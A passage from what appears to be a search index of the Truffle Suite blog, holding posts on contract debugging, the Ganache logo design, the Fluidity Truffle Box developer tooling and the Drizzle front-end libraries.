empty Truffle project. You can step through and set breakpoints; inspect both decoded variables and the raw binary state; and get return values, revert messages, and stacktraces just like normal. Now this example is a minimal one just to show how things work. But it will work just as well in your existing projects on transactions that feature your contracts in your project interacting with external verified contracts deployed on live networks. Right now \"verified contracts\" just means contracts verified on Etherscan, but we're also looking at supporting the new Sourcify project, which provides a more decentralized alternative to Etherscan's repository. We plan to add this in an upcoming release. But as of right now, you can use this feature with Etherscan's large library of verified contracts! Update : As of Truffle v5.1.32, Sourcify is now supported! Truffle Debugger will now check both Etherscan and Sourcify for verified contract sources! Hope you find this as exciting as we do! Thanks for using Truffle!", "title": "Example: Debug ENS in a [mostly] empty Truffle project!"}, {"location": "blog/designing-the-ganache-logo/", "text": "Last week we released Ganache , a personal blockchain for Ethereum development. Many of you commented on the design of the landing page and logo, but just how did the gooey cube come to be? Let's take a trip through the 30+ iterations that led to our newest confection. ![Final Ganache Logomark](/img/blog/designing-the-ganache-logo/final-logomark.png) Before setting out on our design journey, we started with some loose guidelines: The new logo should be round and have some dimensionality to keep it consistent with the Truffle logo. The colors should consist of chocolate, an accent color and white. The concepts we explored can be roughly broken down into 4 categories: Core Cutaways, Toppings, Gooey Cores and Soft Blocks. Core Cutaways \u00b6 The first set of core cutaways was an attempt to convey that Ganache, as a local development blockchain, was the \"core\" of your development workflow. They also depict a ganache filled truffle candy of varying viscosities. It was toward the end of this stage we qualified one of our initial guidelines. The logo's dimensionality should be represented purely by shape--no gradients! Fun fact : We considered one of the third row, second and third column concepts as a final candidate, but scrapped it when Tim's wife said it looks like a banana slug floating in space. My baby, a slug?! A great reminder to not get too attached before getting feedback! Toppings \u00b6 Questions about the ability of the core cutaways to translate to flat color, as well as being dimensionally mismatched with the Truffle logo caused us to consider a simpler approach; a spherical candy with ganache on the outside. Overall these failed to look interesting and had the opposite problem in that they weren't dimensional enough. Gooey Cores \u00b6 Not satisfied with the topping options we pressed on and attempted the core concept again, this time with some fancier cutaways. While they stood on their own, they were too wide a departure from the Truffle logo. This lack of cohesion lead to a realization that would be our design breakthrough. Soft Blocks \u00b6 Letting go of our assumption that the shape should be round unlocked a series of designs that eventually led to our final logo. To achieve a more interesting drip pattern, we traced and combined different stages of glaze dripping down a cake. It became apparent that this approach was interesting, but made an overly detailed drip pattern which we later simplified for the final. We also tried a few different treatments of the candy's reflection. Check out that longhorn steer in the lower-left! The Final Logo \u00b6 Success! After reconsidering some assumptions and solidifying others, we arrived at our final design. The final logo has both a compelling design and the following qualities that made it a winner: The colors consist of chocolate, an accent color and white; a guideline we'll keep going forward. It's metaphorically grounded in the product it represents--it's a block, after all! The gooey consistency and soft, rounded corners represent the intimidating technical concept of a blockchain in a friendly and approachable way. ![Final Ganache Logo](/img/blog/designing-the-ganache-logo/final-logomark.png) We had a blast iterating this logo and Ganache itself. We hoped you learned from our experience and maybe picked up some of your own inspiration along the way. Happy illustrating! -- Josh & the Truffle Team", "title": "Designing the Ganache Logo"}, {"location": "blog/designing-the-ganache-logo/#core-cutaways", "text": "The first set of core cutaways was an attempt to convey that Ganache, as a local development blockchain, was the \"core\" of your development workflow. They also depict a ganache filled truffle candy of varying viscosities. It was toward the end of this stage we qualified one of our initial guidelines. The logo's dimensionality should be represented purely by shape--no gradients! Fun fact : We considered one of the third row, second and third column concepts as a final candidate, but scrapped it when Tim's wife said it looks like a banana slug floating in space. My baby, a slug?! A great reminder to not get too attached before getting feedback!", "title": "Core Cutaways"}, {"location": "blog/designing-the-ganache-logo/#toppings", "text": "Questions about the ability of the core cutaways to translate to flat color, as well as being dimensionally mismatched with the Truffle logo caused us to consider a simpler approach; a spherical candy with ganache on the outside. Overall these failed to look interesting and had the opposite problem in that they weren't dimensional enough.", "title": "Toppings"}, {"location": "blog/designing-the-ganache-logo/#gooey-cores", "text": "Not satisfied with the topping options we pressed on and attempted the core concept again, this time with some fancier cutaways. While they stood on their own, they were too wide a departure from the Truffle logo. This lack of cohesion lead to a realization that would be our design breakthrough.", "title": "Gooey Cores"}, {"location": "blog/designing-the-ganache-logo/#soft-blocks", "text": "Letting go of our assumption that the shape should be round unlocked a series of designs that eventually led to our final logo. To achieve a more interesting drip pattern, we traced and combined different stages of glaze dripping down a cake. It became apparent that this approach was interesting, but made an overly detailed drip pattern which we later simplified for the final. We also tried a few different treatments of the candy's reflection. Check out that longhorn steer in the lower-left!", "title": "Soft Blocks"}, {"location": "blog/designing-the-ganache-logo/#the-final-logo", "text": "Success! After reconsidering some assumptions and solidifying others, we arrived at our final design. The final logo has both a compelling design and the following qualities that made it a winner: The colors consist of chocolate, an accent color and white; a guideline we'll keep going forward. It's metaphorically grounded in the product it represents--it's a block, after all! The gooey consistency and soft, rounded corners represent the intimidating technical concept of a blockchain in a friendly and approachable way. ![Final Ganache Logo](/img/blog/designing-the-ganache-logo/final-logomark.png) We had a blast iterating this logo and Ganache itself. We hoped you learned from our experience and maybe picked up some of your own inspiration along the way. Happy illustrating! -- Josh & the Truffle Team", "title": "The Final Logo"}, {"location": "blog/develop-using-fluidity-truffle-box/", "text": "TLDR; Fluidity has a pretty awesome truffle-box with lots of goodies to build secure, well-tested smart contracts. With two simple commands, you\u2019ll be set up for development using these testing and security tools preconfigured. To use: npm install -g truffle truffle unbox fluidity/fluidity-truffle-box Develop using Fluidity Truffle Box \u00b6 Today, I\u2019d like to share Fluidity\u2019s Truffle Box. It contains a combination of tools we use to develop, test, and analyze our smart contracts. As our team has created several products and proof-of-concepts, we\u2019ve developed a set of standards for creating smart contract repos and having a truffle-box makes this easier. We\u2019ve tried and tested different tools and this box contains our favorite tools for efficient development. The Fluidity Truffle Box allows us to bootstrap our smart contract projects. This box focuses primarily on building safe and secure smart contracts that can be easily audited. We\u2019re able to consolidate many of the new tools, as well as ensure that any projects we start always use up to date versions. Prior to starting new projects, we double check that the packages and tools within truffle-box are up to date. We acknowledge this truffle-box is not a kitchen sink of all the tools. It has been curated based upon what we consistently use. The box doesn\u2019t have a UI component and mostly contains configurations and tools that aid in testing. Core Tools \u00b6 At Fluidity we write smart contracts with Solidity using the latest fixed version, currently 0.5.10, and we use Ganache as our primary test chain. We use Open-Zeppelin as the base for many of our contracts\u2019 systems. In addition, there\u2019s a linter for both the smart contracts and tests using solhint and standard . A linter analyzes code and tests and then either recommends or updates the code for potential syntax errors and style recommendations. Solhint\u2019s configuration is present in fluidity-truffle-box and tries to closely align with the Solidity documentation. We use standard because it\u2019s opinionated and keeps the codebase consistent with minimal fuss. Thus, standard doesn\u2019t have any custom configurations. How we handle testing and code coverage \u00b6 Gnosis Mock Contract \u00b6 Gnosis-Mock is a comprehensive mocking smart contract that allows us to perform unit-testing of our smart contracts. For those not familiar, mocking means creating dummy objects to simulate the behavior of real objects. Mocking allows one to isolate the behavior of the testable object from any other dependencies. As an example, certain behavior in smart contract designs, such as closing a token sale, may require dependencies on several state variables and contracts to already be triggered to allow it to burn tokens. To close a token sale, let\u2019s say you need to have started the sale, sold some threshold of tokens, reached a certain future block, and given close sale privileges to another user. Any one of these requirements, outside of just calling close sale, would need to be run if mocking were not used. By simulating these states with dummy smart contract, it narrows down exactly what needs to be tested. We heavily use the Gnosis mock library which allows us to test contracts independently before running any integration tests. Truffle Assertions \u00b6 Truffle assertions has streamlined how we test events and states of smart contracts. The packages works inside Truffle tests and provides more assertions to call about smart contract states. It supports revert reason strings so we can be confident that exact cases are hit on revert. In addition, it provides more granular ways to test for function failures. Eth-gas-reporter \u00b6 Eth gas reporter shows us the gas usage per unit tests in a nice report after running your test suite. We\u2019ve tried many other tools before as well as trying to write custom gas usage with web3. This has been a recent find for us and has made gas analysis much easier. Solidity-coverage \u00b6 We use solidity-coverage to determine what percentage of the codebase is covered by unit tests. We use a forked version by leapdao because this version supports many of the breaking changes with Solidity 0.5.0+. Code coverages give a helpful metric to ensure we\u2019re testing as we code and that all branch paths are tested. It has also served for us to remove redundant code paths that we\u2019ve found were not accessible. In addition, we have incorporated code-coverage with our CI process, meaning it is automatically executed on every pull request we make, allowing us to easily check PRs for code coverage. The configuration is stored in <project_rool>/.solcover.js , and can be personalised for your project. Slither and Mythril \u00b6 Both slither and mythril are python packages that we\u2019ve included in our truffle-box. They are security tools by Trail of Bits that allow us to better self-audit our code and evaluate many of our invariants and assumptions internally. Instructions to run each of these packages are stored in the README.md file of the fluidity-truffle-box. Slither is a static code analyzer by Trail of Bits. It runs across the contracts directory fairly quickly (< 1 min) and picks up potentially vulnerable Solidity code. Mythril is a security analysis tool for EVM bytecode from ConsenSys. The program takes much longer to run, and while it\u2019s in the truffle-box, we\u2019ll usually run this tool on AWS or another cloud environment and analyze those results. While there is some overlap of errors that are picked up by truffle-compile, slither, and mythril, each focuses on different types of error. We therefore find it helpful to use all 3 on our contracts. Circle CI Template \u00b6 At Fluidity we use circle-ci for our continuous integration. By having sample templates in the repo, it\u2019s more convenient to making sure we enable it whenever we create new repositories. The new repos therefore constantly have to build successfully and migrate via Ganache, and test coverage is apparent to all members on the team. With the template in place, it\u2019s quick for us to add additional commands such as linting or gas reporting dependent on where we are in the development process. Unique features \u00b6 Using allowUnlimitedContractSize \u00b6 We allow our initial contract designs not to be limited by any contract size constraints with the use of the flag allowUnlimitedContractSize . Ganache has a default gas limit of 6,721,975 which does not reflect the actual gas limit of public testnet and mainnets, being 7,000,000 and 8,000,000 respectively. While our team does want to reduce the gas footprint while developing and iterating through different token designs/debugging, it\u2019s been helpful not to be limited by a strict gas price or gas limit with testing. For example, we use longer descriptive messages in revert reasons when developing, but reduce them to be more succinct for final code versions. Reducing the string lengths saved us 3,000,000 gas. Run each line in a different terminal window yarn ganache-unlimited yarn truffle truffle-unlimited After settling on a design, we\u2019ll start iterating to reduce gas usage. As mentioned above, we use eth-gas-reporter to do this. Thus, with 100% test coverage and integration tests, eth-gas-reporter gives a pretty comprehensive understanding of gas usage throughout. Custom Migration and Test Utilities \u00b6 There are two custom utilities files that we have created and keep available for the right circumstance of contracts. First, we have a custom migration utilities script. Truffle has deployed contract management but only stores a single address for each contract deploy per network id; each deployed contract is treated as a singleton. However, there have been cases where we\u2019ve deployed multiple instances of the same contract and have needed to save each of the deployed contract addresses. Our solution was to create a custom migration_utils.js that stored the contract addresses per migration in a JSON file. From there, integration tests and accessory scripts use the contract addresses while still relying on the build directory for ABIs. The second script is related to testing time sensitive smart contracts. We\u2019ve written a post about it called Standing the Time of Test and we\u2019ve used this script and features in Ganache to run both idempotent tests as well as run simulations. Running the command for a specific date yarn ganache-unlimited --time '2019-02-15T15:53:00+00:00' Anything else \u00b6 Most of the features are in the README in the directory and I\u2019d love to take any questions or issues using this repository. Linking all these tools allows for a solid, sane development process for our team. They\u2019re always at our fingertips with fluidity-truffle-box. Hopefully, you\u2019ll be able to use the Fluidity Truffle Box to enhance your own smart contract development process! Github repos \u00b6 Fluidity Truffle Box: https://github.com/fluidity/fluidity-truffle-box Gnosis-Mock: https://github.com/gnosis/mock-contract Truffle Assertions: https://github.com/rkalis/truffle-assertions Eth gas reporter: https://github.com/cgewecke/eth-gas-reporter Leapdao Solidity-Coverage: https://github.com/leapdao/solidity-coverage Original Solidity-Coverage: https://github.com/sc-forks/solidity-coverage Slither: https://github.com/crytic/slither Mythril: https://github.com/ConsenSys/mythril Fluidity Resources: \u00b6 Website: https://fluidity.io Twitter: https://twitter.com/fluidityio Facebook: https://facebook.com/fluidityio/ LinkedIn: https://linkedin.com/company/fluidityio/ YouTube: https://youtube.com/c/fluidityio Blog: https://medium.com/fluidity", "title": "Develop using Fluidity Truffle Box"}, {"location": "blog/develop-using-fluidity-truffle-box/#develop-using-fluidity-truffle-box", "text": "Today, I\u2019d like to share Fluidity\u2019s Truffle Box. It contains a combination of tools we use to develop, test, and analyze our smart contracts. As our team has created several products and proof-of-concepts, we\u2019ve developed a set of standards for creating smart contract repos and having a truffle-box makes this easier. We\u2019ve tried and tested different tools and this box contains our favorite tools for efficient development. The Fluidity Truffle Box allows us to bootstrap our smart contract projects. This box focuses primarily on building safe and secure smart contracts that can be easily audited. We\u2019re able to consolidate many of the new tools, as well as ensure that any projects we start always use up to date versions. Prior to starting new projects, we double check that the packages and tools within truffle-box are up to date. We acknowledge this truffle-box is not a kitchen sink of all the tools. It has been curated based upon what we consistently use. The box doesn\u2019t have a UI component and mostly contains configurations and tools that aid in testing.", "title": "Develop using Fluidity Truffle Box"}, {"location": "blog/develop-using-fluidity-truffle-box/#core-tools", "text": "At Fluidity we write smart contracts with Solidity using the latest fixed version, currently 0.5.10, and we use Ganache as our primary test chain. We use Open-Zeppelin as the base for many of our contracts\u2019 systems. In addition, there\u2019s a linter for both the smart contracts and tests using solhint and standard . A linter analyzes code and tests and then either recommends or updates the code for potential syntax errors and style recommendations. Solhint\u2019s configuration is present in fluidity-truffle-box and tries to closely align with the Solidity documentation. We use standard because it\u2019s opinionated and keeps the codebase consistent with minimal fuss. Thus, standard doesn\u2019t have any custom configurations.", "title": "Core Tools"}, {"location": "blog/develop-using-fluidity-truffle-box/#how-we-handle-testing-and-code-coverage", "text": "", "title": "How we handle testing and code coverage"}, {"location": "blog/develop-using-fluidity-truffle-box/#gnosis-mock-contract", "text": "Gnosis-Mock is a comprehensive mocking smart contract that allows us to perform unit-testing of our smart contracts. For those not familiar, mocking means creating dummy objects to simulate the behavior of real objects. Mocking allows one to isolate the behavior of the testable object from any other dependencies. As an example, certain behavior in smart contract designs, such as closing a token sale, may require dependencies on several state variables and contracts to already be triggered to allow it to burn tokens. To close a token sale, let\u2019s say you need to have started the sale, sold some threshold of tokens, reached a certain future block, and given close sale privileges to another user. Any one of these requirements, outside of just calling close sale, would need to be run if mocking were not used. By simulating these states with dummy smart contract, it narrows down exactly what needs to be tested. We heavily use the Gnosis mock library which allows us to test contracts independently before running any integration tests.", "title": "Gnosis Mock Contract"}, {"location": "blog/develop-using-fluidity-truffle-box/#truffle-assertions", "text": "Truffle assertions has streamlined how we test events and states of smart contracts. The packages works inside Truffle tests and provides more assertions to call about smart contract states. It supports revert reason strings so we can be confident that exact cases are hit on revert. In addition, it provides more granular ways to test for function failures.", "title": "Truffle Assertions"}, {"location": "blog/develop-using-fluidity-truffle-box/#eth-gas-reporter", "text": "Eth gas reporter shows us the gas usage per unit tests in a nice report after running your test suite. We\u2019ve tried many other tools before as well as trying to write custom gas usage with web3. This has been a recent find for us and has made gas analysis much easier.", "title": "Eth-gas-reporter"}, {"location": "blog/develop-using-fluidity-truffle-box/#solidity-coverage", "text": "We use solidity-coverage to determine what percentage of the codebase is covered by unit tests. We use a forked version by leapdao because this version supports many of the breaking changes with Solidity 0.5.0+. Code coverages give a helpful metric to ensure we\u2019re testing as we code and that all branch paths are tested. It has also served for us to remove redundant code paths that we\u2019ve found were not accessible. In addition, we have incorporated code-coverage with our CI process, meaning it is automatically executed on every pull request we make, allowing us to easily check PRs for code coverage. The configuration is stored in <project_rool>/.solcover.js , and can be personalised for your project.", "title": "Solidity-coverage"}, {"location": "blog/develop-using-fluidity-truffle-box/#slither-and-mythril", "text": "Both slither and mythril are python packages that we\u2019ve included in our truffle-box. They are security tools by Trail of Bits that allow us to better self-audit our code and evaluate many of our invariants and assumptions internally. Instructions to run each of these packages are stored in the README.md file of the fluidity-truffle-box. Slither is a static code analyzer by Trail of Bits. It runs across the contracts directory fairly quickly (< 1 min) and picks up potentially vulnerable Solidity code. Mythril is a security analysis tool for EVM bytecode from ConsenSys. The program takes much longer to run, and while it\u2019s in the truffle-box, we\u2019ll usually run this tool on AWS or another cloud environment and analyze those results. While there is some overlap of errors that are picked up by truffle-compile, slither, and mythril, each focuses on different types of error. We therefore find it helpful to use all 3 on our contracts.", "title": "Slither and Mythril"}, {"location": "blog/develop-using-fluidity-truffle-box/#circle-ci-template", "text": "At Fluidity we use circle-ci for our continuous integration. By having sample templates in the repo, it\u2019s more convenient to making sure we enable it whenever we create new repositories. The new repos therefore constantly have to build successfully and migrate via Ganache, and test coverage is apparent to all members on the team. With the template in place, it\u2019s quick for us to add additional commands such as linting or gas reporting dependent on where we are in the development process.", "title": "Circle CI Template"}, {"location": "blog/develop-using-fluidity-truffle-box/#unique-features", "text": "", "title": "Unique features"}, {"location": "blog/develop-using-fluidity-truffle-box/#using-allowunlimitedcontractsize", "text": "We allow our initial contract designs not to be limited by any contract size constraints with the use of the flag allowUnlimitedContractSize . Ganache has a default gas limit of 6,721,975 which does not reflect the actual gas limit of public testnet and mainnets, being 7,000,000 and 8,000,000 respectively. While our team does want to reduce the gas footprint while developing and iterating through different token designs/debugging, it\u2019s been helpful not to be limited by a strict gas price or gas limit with testing. For example, we use longer descriptive messages in revert reasons when developing, but reduce them to be more succinct for final code versions. Reducing the string lengths saved us 3,000,000 gas. Run each line in a different terminal window yarn ganache-unlimited yarn truffle truffle-unlimited After settling on a design, we\u2019ll start iterating to reduce gas usage. As mentioned above, we use eth-gas-reporter to do this. Thus, with 100% test coverage and integration tests, eth-gas-reporter gives a pretty comprehensive understanding of gas usage throughout.", "title": "Using allowUnlimitedContractSize"}, {"location": "blog/develop-using-fluidity-truffle-box/#custom-migration-and-test-utilities", "text": "There are two custom utilities files that we have created and keep available for the right circumstance of contracts. First, we have a custom migration utilities script. Truffle has deployed contract management but only stores a single address for each contract deploy per network id; each deployed contract is treated as a singleton. However, there have been cases where we\u2019ve deployed multiple instances of the same contract and have needed to save each of the deployed contract addresses. Our solution was to create a custom migration_utils.js that stored the contract addresses per migration in a JSON file. From there, integration tests and accessory scripts use the contract addresses while still relying on the build directory for ABIs. The second script is related to testing time sensitive smart contracts. We\u2019ve written a post about it called Standing the Time of Test and we\u2019ve used this script and features in Ganache to run both idempotent tests as well as run simulations. Running the command for a specific date yarn ganache-unlimited --time '2019-02-15T15:53:00+00:00'", "title": "Custom Migration and Test Utilities"}, {"location": "blog/develop-using-fluidity-truffle-box/#anything-else", "text": "Most of the features are in the README in the directory and I\u2019d love to take any questions or issues using this repository. Linking all these tools allows for a solid, sane development process for our team. They\u2019re always at our fingertips with fluidity-truffle-box. Hopefully, you\u2019ll be able to use the Fluidity Truffle Box to enhance your own smart contract development process!", "title": "Anything else"}, {"location": "blog/develop-using-fluidity-truffle-box/#github-repos", "text": "Fluidity Truffle Box: https://github.com/fluidity/fluidity-truffle-box Gnosis-Mock: https://github.com/gnosis/mock-contract Truffle Assertions: https://github.com/rkalis/truffle-assertions Eth gas reporter: https://github.com/cgewecke/eth-gas-reporter Leapdao Solidity-Coverage: https://github.com/leapdao/solidity-coverage Original Solidity-Coverage: https://github.com/sc-forks/solidity-coverage Slither: https://github.com/crytic/slither Mythril: https://github.com/ConsenSys/mythril", "title": "Github repos"}, {"location": "blog/develop-using-fluidity-truffle-box/#fluidity-resources", "text": "Website: https://fluidity.io Twitter: https://twitter.com/fluidityio Facebook: https://facebook.com/fluidityio/ LinkedIn: https://linkedin.com/company/fluidityio/ YouTube: https://youtube.com/c/fluidityio Blog: https://medium.com/fluidity", "title": "Fluidity Resources:"}, {"location": "blog/drizzle-150-a-new-beginning/", "text": "_The dawn of a new era for regular releases and a better contributor experience_ Since the beginning, our goal here at Truffle has been to make dapp development as easy as it can be. To this end Josh Quintal created Drizzle , a managed Redux store to make interfacing with the blockchain just a little bit easier. From many to one \u00b6 Today, we are announcing that we are moving to a monorepo. From now on, a single PR can be used to update code and documentation that used to span multiple repos. Over the last two years, we\u2019ve developed libraries on top of Drizzle such as drizzle-react and drizzle-react-components . Since these libraries depend so heavily on each other, it only makes sense for us to move all of these packages to a monorepo to streamline any updates. In addition, we now also have an experimental Vue.js plugin that fits naturally into the monorepo architecture. It is very likely that going forward we will develop new packages to aid the Drizzle ecosystem in this manner. Scoped package names \u00b6 Another big change we are making is towards scoped package names on NPM. This means that instead of: drizzle drizzle-react drizzle-react-components drizzle-vue-plugin We will now have: @drizzle/store @drizzle/react-plugin @drizzle/react-components @drizzle/vue-plugin From an organizational standpoint, this makes it a lot more intuitive to manage your dapp development. Testing \u00b6 Prior to the monorepo, testing our libraries together was a slow, error-prone and painful experience. Our maintainers had to build custom dapps to isolate changes and manually link packages together as well as coordinate with ganache for each front end. The monorepo allows us to have dedicated front end apps that automatically build against the latest libraries and we can conveniently orchestrate them with a single ganache instance in just a couple commands. In other words, you can easily spin up three apps to test various aspects of the monorepo in seconds . _Easily spin up real front ends to test that dapps can work with the current code_ Better release strategy \u00b6 Perhaps the biggest thing that the changes above allow us to do is more frequent releases. In the past year, we often had to deal with delaying the publishing of a new change because it required testing and updating other repos. Our publishing process was essentially being blocked by having to synchronize changes amongst multiple repos. With a monorepo, that all changes, which means that you can look forward to more regular releases and a faster turnaround time for getting issues fixed. Better changelogs are also coming as we move toward adopting conventional commits for each PR that gets merged. Going forward \u00b6 It\u2019s important to note that Drizzle wouldn\u2019t be what it is without the open source community. A big part of why we are making all these changes is because we need you to help us make Web3 a reality together. Here at Truffle, every member on the team is passionate about improving the developer experience of building on Web3. In the upcoming weeks, we will be doing more regular blog posts targeting the front end space so keep an eye out! I would also like to specifically thank Amal Sudama for his work on making this transition. It certainly couldn\u2019t have happened without him.", "title": "Drizzle 1.5.0 - A new beginning"}, {"location": "blog/drizzle-150-a-new-beginning/#from-many-to-one", "text": "Today, we are announcing that we are moving to a monorepo. From now on, a single PR can be used to update code and documentation that used to span multiple repos. Over the last two years, we\u2019ve developed libraries on top of Drizzle such as drizzle-react and drizzle-react-components . Since these libraries depend so heavily on each other, it only makes sense for us to move all of these packages to a monorepo to streamline any updates. In addition, we now also have an experimental Vue.js plugin that fits naturally into the monorepo architecture. It is very likely that going forward we will develop new packages to aid the Drizzle ecosystem in this manner.", "title": "From many to one"}, {"location": "blog/drizzle-150-a-new-beginning/#scoped-package-names", "text": "Another big change we are making is towards scoped package names on NPM. This means that instead of: drizzle drizzle-react drizzle-react-components drizzle-vue-plugin We will now have: @drizzle/store @drizzle/react-plugin @drizzle/react-components @drizzle/vue-plugin From an organizational standpoint, this makes it a lot more intuitive to manage your dapp development.", "title": "Scoped package names"}, {"location": "blog/drizzle-150-a-new-beginning/#testing", "text": "Prior to the monorepo, testing our libraries together was a slow, error-prone and painful experience. Our maintainers had to build custom dapps to isolate changes and manually link packages together as well as coordinate with ganache for each front end. The monorepo allows us to have dedicated front end apps that automatically build against the latest libraries and we can conveniently orchestrate them with a single ganache instance in just a couple commands. In other words, you can easily spin up three apps to test various aspects of the monorepo in seconds . _Easily spin up real front ends to test that dapps can work with the current code_", "title": "Testing"}, {"location": "blog/drizzle-150-a-new-beginning/#better-release-strategy", "text": "Perhaps the biggest thing that the changes above allow us to do is more frequent releases. In the past year, we often had to deal with delaying the publishing of a new change because it required testing and updating other repos. Our publishing process was essentially being blocked by having to synchronize changes amongst multiple repos. With a monorepo, that all changes, which means that you can look forward to more regular releases and a faster turnaround time for getting issues fixed. Better changelogs are also coming as we move toward adopting conventional commits for each PR that gets merged.", "title": "Better release strategy"}, {"location": "blog/drizzle-150-a-new-beginning/#going-forward", "text": "It\u2019s important to note that Drizzle wouldn\u2019t be what it is without the open source community. A big part of why we are making all these changes is because we need you to help us make Web3 a reality together. Here at Truffle, every member on the team is passionate about improving the developer experience of building on Web3. In the upcoming weeks, we will be doing more regular blog posts targeting the front end space so keep an eye out! I would also like to specifically thank Amal Sudama for his work on making this transition. It certainly couldn\u2019t have happened without him.", "title": "Going forward"}, {"location": "blog/drizzle-reactive-ethereum-data-for-front-ends/", "text": "Today we're proud to announce the addition of a new product to the Truffle Suite: Drizzle. Drizzle is a collection of front-end libraries that make writing dapp front-ends easier and more predictable. The core is based on a Redux store. We take care of synchronizing your contract data, transaction data and more. Things stay fast because you declare what to keep in sync. Importantly, this means you have access to the spectacular development tools around Redux. Want to time travel through your recent transactions? You can do that with a slider. Your browser does not support the video tag. Drizzle's architecture is completely modular. This means you never lose access to the underlying web3 functionality you already know--drizzle as much or as little as you like. We've created two packages for use with React, but the core functionality is contained in the base drizzle module itself. If you're familiar with Redux, it's not a stretch to create an Angular library or use it for something other than a webapp. Want to dive in right away? truffle unbox drizzle and you've got a full example dapp. Need more info? Read on! The Libraries \u00b6 Drizzle \u00b6 The core library responsible for web3, account and contract instantiation; wiring up the necessary synchronizations and providing additional contract functionality. GitHub Repo Drizzle React \u00b6 Provides a DrizzleProvider component and drizzleConnect helper method to make it easier to connect Drizzle with your React app. GitHub Repo Drizzle React Components \u00b6 A library of useful components for common dapp functions. Currently includes: * LoadingContainer : Wraps your app, ensuring it waits for web3 and contract instantiation and displays relevant feedback if something goes wrong. * ContractData : Displays contract call output. * ContractForm : Automatically generates a form for contract transactions. GitHub Repo The Box \u00b6 Shown in the video above, this box makes use of all of Drizzle's libraries in a finished example dapp. GitHub Repo Help us grow this baby! What do you want to see from Drizzle? More components? More options? To put it another way: what are you sick of doing on the front-end? We're excited to hear your feedback and can't wait to see what you'll build! -- Josh & the Truffle Team", "title": "Drizzle - Reactive Ethereum Data for Front-ends"}, {"location": "blog/drizzle-reactive-ethereum-data-for-front-ends/#the-libraries", "text": "", "title": "The Libraries"}, {"location": "blog/drizzle-reactive-ethereum-data-for-front-ends/#drizzle", "text": "The core library responsible for web3, account and contract instantiation; wiring up the necessary synchronizations and providing additional contract functionality. GitHub Repo", "title": "Drizzle"}, {"location": "blog/drizzle-reactive-ethereum-data-for-front-ends/#drizzle-react", "text": "Provides a DrizzleProvider component and drizzleConnect helper method to make it easier to connect Drizzle with your React app. GitHub Repo", "title": "Drizzle React"}, {"location": "blog/drizzle-reactive-ethereum-data-for-front-ends/#drizzle-react-components", "text": "A library of useful components for common dapp functions. Currently includes: * LoadingContainer : Wraps your app, ensuring it waits for web3 and contract instantiation and displays relevant feedback if something goes wrong. * ContractData : Displays contract call output. * ContractForm : Automatically generates a form for contract transactions. GitHub Repo", "title": "Drizzle React Components"}, {"location": "blog/drizzle-reactive-ethereum-data-for-front-ends/#the-box", "text": "Shown in the video above, this box makes use of all of Drizzle's libraries in a finished example dapp. GitHub Repo Help us grow this baby! What do you want to see from Drizzle? More components? More options? To put it another way: what are you sick of doing on the front-end? We're excited to hear your feedback and can't wait to see what you'll build! -- Josh & the Truffle Team", "title": "The Box"}, {"location": "blog/drizzle-vue-a-truffle-story/", "text": "Truffle is an organization that maintains a balance of transparency, mentorship, encouragement, inclusivity and humor that I'm thankful for everyday. While much could be written about Truffle's management culture, I want to share my experience of working on a side project here. Our remote work setup and the openness of our team contributes to a healthy and productive environment. The ability to schedule zoom sessions to brainstorm and discuss ideas fits well with our schedule. Every member contributes to this culture being generous with their time and knowledge. I'm happy and inspired to see team members grow as developers through the subtle mentorship as a result of our culture. For most of my career, I dreaded mandatory soul draining review type meetings, but at Truffle, I look forward to the incredibly productive and creative weekly one-on-ones I have with Joshua Quintal, our Product Lead. Josh originally developed Drizzle and we often discuss its role in the dapp ecosystem, issues and roadmap during our meetings. About Drizzle \u00b6 Drizzle is a Smart Contract Store with a subscription and mutation API that abstracts away the boilerplate for reading and writing smart contract state as well as listening for contract events. Drizzle originated as a helper library for a React project Josh was developing. However he came to realize that the Smart Contract Store was an important piece needed in dapp development as applications start to scale. In Web 2.0 the need to manage and reason about state at scale has led to libraries like [1] Redux . Similarly, we want to give web 3.0 dapp developers these best practices to leverage as their applications grow in complexity. Drizzle's Unintended Front End Frameworks Exclusion \u00b6 Unfortunately, this is not how Drizzle is understood by developers we interviewed formally and informally. The most common misunderstanding is that Drizzle is coupled with React, the most popular JavaScript front end framework. We can't blame our community as most of our documentation focuses on implementing Dapps using React. Drizzle was initially released with bindings only for React which created this misperception that excluded developers from utilizing other front end frameworks such as Vue and Angular. The problem is that we didn't offer an easy solution for Vue or Angular and our documentation doesn't offer guidance. We want to change this! We want to support all the frameworks! A Vue Plugin Side Project \u00b6 I felt this was an important problem to solve in order to improve the dapp developer experience. It was important to get Drizzle working for Vue. Unfortunately, I knew nothing about Vue. In previous organizations I was a part of, I would have shied away from pursuing this project. However, at Truffle I felt comfortable and empowered to champion the idea. Josh encouraged me to spend the time needed to study Vue and experiment with the concepts. The basic plan was to: - Use Vuex, Vue's popular State management plugin - Transform Drizzle's redux store to be consumed by Vuex - A redux store as an [2] Observable which would allow us to transform/map drizzle state to a more state pieces that Vuex could consume. - This would allow us to have more efficient UI renders by using RxJS techniques like distinctUntilChanged - Create basic Vue components mimicking drizzle-react-components - Vue's architecture allows us to use the adaptor as a datasource as well as provide basic support for Components that can render the data. This gives Vue developers to use our basic Components to make quick proof of concepts, and the flexibility to create richer Components when they need to. A [3] basic proof of concept eventually surfaced and I was happy with the outcome as it showed a path forward to Angular using this approach with RxJS and can't wait to test it out! Collaboration And Improvements \u00b6 Another aspect of Truffle's culture is to promote collaboration and exchange ideas with our community, and meet like minded developers and advocates working on similar problems. We're encouraged to go to meetups and be advocates for this incredible space. I reached out to Julien Klepatch on reddit after seeing his impressive [4] Drizzle overview video and asked for his feedback on the Vue Plugin. His participation, code contribution, code review and feedback clarified the project's direction and generally improved the codebase. Furthermore, he created 3 videos to explain the new plugin. - [5] Drizzle Vue Plugin: overview - [6] Drizzle Vue Plugin: Custom Components - [7] Drizzle Vue Plugin: Events We also run a range of educational programs as part of Truffle University, that amongst other things, teaches developers how to use our full suite of tools. As part of the experience, students are mentored by the team and are encouraged to contribute to open-source projects, such as the Truffle Suite itself. James Kehoe, a developer in our first cohort, uses Vue on a daily basis and took an interest in the plugin. He took the initial design of the Contract Event Logic and turned it into idiomatic Vue. James also improved the documentation and introduced testing to the project. I learned a lot about Vue pairing with James, and look forward to future sessions with him. Take A Preview \u00b6 You can preview the [3] Plugin before we officially release it. Be sure to check out Julien's videos for an excellent walkthrough: [5] Drizzle Vue Plugin: overview , [6] Drizzle Vue Plugin: Custom Components and [7] Drizzle Vue Plugin: Events This project happened because of Truffle's enabling and supportive culture. Truffle is cool like 